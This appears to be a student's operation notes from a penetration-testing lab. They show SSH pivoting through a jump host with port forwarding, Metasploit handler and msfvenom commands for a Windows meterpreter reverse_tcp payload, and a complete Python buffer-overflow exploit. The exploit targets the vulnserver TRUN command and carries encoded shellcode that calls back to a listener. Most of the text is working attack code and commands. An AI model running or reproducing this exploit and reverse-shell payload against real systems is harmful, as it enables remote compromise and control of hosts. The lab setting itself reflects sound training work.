
# scheme of manuever
LINOPS                                      
  -> JUMP                                   ssh -MS /tmp/t1 -p2222 student@127.0.0.1                 
    -> GREYSITE
      ->T3 192.168.150.245
# opnotes: all commands are ran on the linops
ssh -MS /tmp/jump student@10.50.39.53                           -> gets on jump
ssh -S /tmp/jump jump -O forward -L2222:192.168.28.120:4242     -> fowards port 2222 to greysite ip using known alternate ssh port
ssh -MS /tmp/t1 -p2222 student@127.0.0.1                        -> gets onto greysite using the previous forward port and the local host.  


## msfconsole exploit
> use multihandler, > set payload windows/meterpreter/reverse_tcp, > Set LHOST 0.0.0.0, > set lport 1234
## msfvenom 
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.39.104 lport=1234 -b "\x00" -f python

# windows exlpoitation script
#!/usr/bin/env python

import socket

buf = "TRUN /.:/"
buf += "A" * 2003
buf += "\xa0\x12\x50\x62"
buf += "\x90" * 10

buf += b"\xdb\xcc\xbe\xaf\x22\xac\xaa\xd9\x74\x24\xf4\x5a"
buf += b"\x33\xc9\xb1\x59\x31\x72\x19\x83\xea\xfc\x03\x72"
buf += b"\x15\x4d\xd7\x50\x42\x1e\x18\xa9\x93\x40\x28\x7b"
buf += b"\xf7\x0b\x18\x4b\x73\x59\x91\x22\x66\xd6\xfb\x20"
buf += b"\x58\x17\x70\x3a\xb2\xe8\x30\xf1\xe4\xc7\xfe\xaa"
buf += b"\xd5\x46\x83\xb0\x09\xa8\xba\x7a\x5c\xa9\xfb\xcc"
buf += b"\x2a\x46\x51\x44\x86\x88\x01\xd1\x65\x94\xac\x35"
buf += b"\xe2\xa4\xd6\x30\x35\x50\x6b\x3a\x66\xc8\xf8\x64"
buf += b"\xa6\x63\xb6\x8c\xa7\xa0\xc2\x64\xd3\x7a\x84\x47"
buf += b"\xe3\x09\x22\x23\x1a\xdb\x7a\xf3\xb1\x22\xb3\xfe"
buf += b"\xc8\x63\x74\xe1\xbe\x9f\x86\x9c\xb8\x64\xf4\x7a"
buf += b"\x4c\x7a\x5e\x08\xf6\x5e\x5e\xdd\x61\x15\x6c\xaa"
buf += b"\xe6\x71\x71\x2d\x2a\x0a\x8d\xa6\xcd\xdc\x07\xfc"
buf += b"\xe9\xf8\x4c\xa6\x90\x59\x29\x09\xac\xb9\x95\xf6"
buf += b"\x08\xb2\x34\xe0\x2d\x3b\xc7\x0d\x70\xab\x0b\xc0"
buf += b"\x8b\x2b\x04\x53\xff\x19\x8b\xcf\x97\x11\x44\xd6"
buf += b"\x60\x20\x42\xe9\xbf\x8a\x03\x17\x40\xea\x0a\xdc"
buf += b"\x14\xba\x24\xf5\x14\x51\xb5\xfa\xc0\xcf\xbf\x6c"
buf += b"\xe1\x3d\xe7\x04\x9d\x43\xe7\xd0\x8f\xca\x01\x88"
buf += b"\x7f\x9c\x9d\x69\xd0\x5c\x4e\x02\x3a\x53\xb1\x32"
buf += b"\x45\xbe\xda\xd9\xaa\x16\xb2\x75\x52\x33\x48\xe7"
buf += b"\x9b\xee\x34\x27\x17\x1a\xc8\xe6\xd0\x6f\xda\x1f"
buf += b"\x87\x8f\x22\xe0\x22\x8f\x48\xe4\xe4\xd8\xe4\xe6"
buf += b"\xd1\x2e\xab\x19\x34\x2d\xac\xe6\xc9\x07\xc6\xd1"
buf += b"\x5f\x27\xb0\x1d\xb0\xa7\x40\x48\xda\xa7\x28\x2c"
buf += b"\xbe\xf4\x4d\x33\x6b\x69\xde\xa6\x94\xdb\xb2\x61"
buf += b"\xfd\xe1\xed\x46\xa2\x1a\xd8\xd4\xa5\xe4\x9e\xf2"
buf += b"\x0d\x8c\x60\x43\xae\x4c\x0b\x43\xfe\x24\xc0\x6c"
buf += b"\xf1\x84\x29\xa7\x5a\x8c\xa0\x26\x28\x2d\xb4\x62"
buf += b"\xec\xf3\xb5\x81\x35\x04\xcf\xea\xca\xe5\x30\xe3"
buf += b"\xae\xe6\x30\x0b\xd1\xdb\xe6\x32\xa7\x1a\x3b\x01"
buf += b"\xb8\x29\x1e\x20\x53\x51\x0c\x32\x76"

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)    
s.connect (("192.168.150.245",9999))                     
print s.recv(1024)                                       
s.send(buf)                                               
print s.recv(1024)                                        
s.close()                                                 
